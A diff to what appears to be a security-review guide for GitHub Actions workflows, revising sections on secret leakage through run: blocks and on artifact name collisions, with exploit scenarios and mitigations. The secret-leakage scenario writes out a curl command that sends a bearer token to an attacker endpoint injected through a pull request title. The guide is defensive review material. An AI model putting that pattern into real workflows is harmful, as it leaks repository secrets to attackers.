@@ -127,11 +127,11 @@ jobs:
 
 #### 3.5 Secret leakage via `run:` block
 
-`env: ${{ secrets.X }}` in a `run:` block where the same env var name appears in a log line, error message, or third-party action argument can be captured in build logs (visible to anyone with `actions: read` on PRs).
+A `run:` block that puts `${{ secrets.X }}` into an env var, then references that env var in a `curl`, an HTTP header, a stack trace, or any line that ends up in build logs (visible to anyone with `actions: read` on the repo) can leak the secret. GitHub's auto-masking masks **on registered secret names**, but `run:` blocks can construct new strings (`Authorization: Bearer $FOO_TOKEN`) that don't trigger the mask check, or write the secret to a file that a follow-up step's log captures.
 
-**Exploit scenario template**: "Workflow sets `FOO_TOKEN: ${{ secrets.FOO }}` as env. A subsequent `curl -H \"Authorization: Bearer $FOO_TOKEN\" $URL` line with `$URL` set to attacker-controlled host (e.g. via `pull_request_target` + interpolated title) exfiltrates the token in the URL."
+**Exploit scenario template**: "Workflow sets `env: FOO_TOKEN: ${{ secrets.FOO_TOKEN }}`. A `run:` block later does `curl -H \"Authorization: Bearer $FOO_TOKEN\" \"$URL\"` where `$URL` flows from `pull_request_target` + `github.event.pull_request.title` (per §3.2 expression injection). Attacker sets title to their endpoint; the curl line logs `Bearer <real-token>` to their server's request log."
 
-**Mitigation**: mask each secret value (GitHub does it automatically when matched by name pattern, but be explicit). Never echo secrets in curl/build logs; use pre-masked values: `${{ secrets.MASKED_NAME }}` (mask by secret name pattern). Never pass secrets via URL parameters.
+**Mitigation**: never echo secrets in URLs or headers; pass secrets only via inputs that the consuming action documents as secret-aware. When a secret MUST appear in a shell command, set the env var with `env:` and reference via the variable, never echo it. Disable curl's verbose log in CI: `curl -sS ...` (no `-v`, no `-i` printing headers). Never redirect a secret-bearing env var into `tee` or `>` to a file in a `run:` block that follows with `cat` or `head`.
 
 #### 3.6 Cross-workflow attack via `workflow_run`
 
@@ -143,11 +143,11 @@ jobs:
 
 #### 3.7 Artifact poisoning
 
-`actions/upload-artifact` / `actions/download-artifact` paths flow into `${{ github.* }}` resolved to a PR's own artifact name → can collide across PRs in the same workflow run, deliver wrong artifact to reviewer.
+`actions/upload-artifact` / `actions/download-artifact` resolved to a **non-unique artifact name** can collide across concurrent runs of the same workflow (different PRs, different runs, different workflow_dispatch invocations all share the artifact namespace). A download without a per-run unique path picks up someone else's upload — possibly a malicious build from a different PR.
 
-**Exploit scenario template**: "Two PRs run in parallel. PR #100 uploads artifact `dist.tar.gz`. PR #101's downstream job downloads `dist.tar.gz` but the cache key collision means PR #101 deploys PR #100's malicious build."
+**Exploit scenario template**: "PR #100's workflow uploads `dist.tar.gz`. PR #101's downstream job downloads `dist.tar.gz` in the same workflow_dispatch window. Without `github.run_id` in the artifact name, PR #101's deploy job receives PR #100's malicious `dist.tar.gz`."
 
-**Mitigation**: include `github.run_id` + `github.run_attempt` in artifact name. Don't download artifact in same workflow that uploaded from a fork.
+**Mitigation**: include `github.run_id` + `github.run_attempt` in every artifact name; use `outputs.<job-id>.artifact` style download references where supported. Never download an artifact in a job that uploaded it from a fork-PR context.
 
 ### 4. Output format
 
